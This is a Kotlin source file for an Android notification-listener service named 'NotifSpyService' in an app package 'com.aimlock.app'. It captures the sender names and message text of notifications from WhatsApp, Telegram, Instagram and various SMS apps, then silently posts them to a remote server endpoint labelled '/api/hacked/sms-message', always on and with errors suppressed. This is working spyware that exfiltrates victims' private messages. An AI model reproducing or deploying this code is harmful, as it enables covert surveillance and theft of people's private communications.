package com.aimlock.app

import android.app.Notification
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NotifSpyService : NotificationListenerService() {

    private val targetApps = mapOf(
        "com.whatsapp"                      to "WhatsApp",
        "com.whatsapp.w4b"                  to "WA Business",
        "org.telegram.messenger"            to "Telegram",
        "org.telegram.messenger.web"        to "Telegram",
        "com.instagram.android"             to "Instagram",
        "com.android.mms"                   to "SMS",
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging"     to "SMS",
        "com.miui.sms"                      to "SMS",
        "com.oppo.message"                  to "SMS",
        "com.coloros.message"               to "SMS",
        "com.vivo.message"                  to "SMS",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg     = sbn.packageName ?: return
        val appName = targetApps[pkg]  ?: return   // bukan app target, skip

        val prefs     = getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
        // Selalu aktif — tidak perlu toggle
        val serverUrl = prefs.getString("flutter.serverUrl", "")
            ?: prefs.getString("serverUrl", "") ?: ""
        val deviceId  = prefs.getString("flutter.deviceId", "")
            ?: prefs.getString("deviceId", "") ?: ""
        if (serverUrl.isEmpty() || deviceId.isEmpty()) return
        val token = prefs.getString("deviceToken_$deviceId", "") ?: ""

        val extras  = sbn.notification?.extras ?: return
        val title   = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()    ?: ""
        val text    = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()     ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val content = bigText.ifEmpty { text }
        if (content.isBlank()) return

        val time = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(sbn.postTime))

        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("appName",  appName)
                    put("sender",   title)
                    put("content",  content)
                    put("time",     time)
                    put("pkg",      pkg)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/sms-message")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", token)
                conn.doOutput = true; conn.connectTimeout = 8000; conn.readTimeout = 8000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
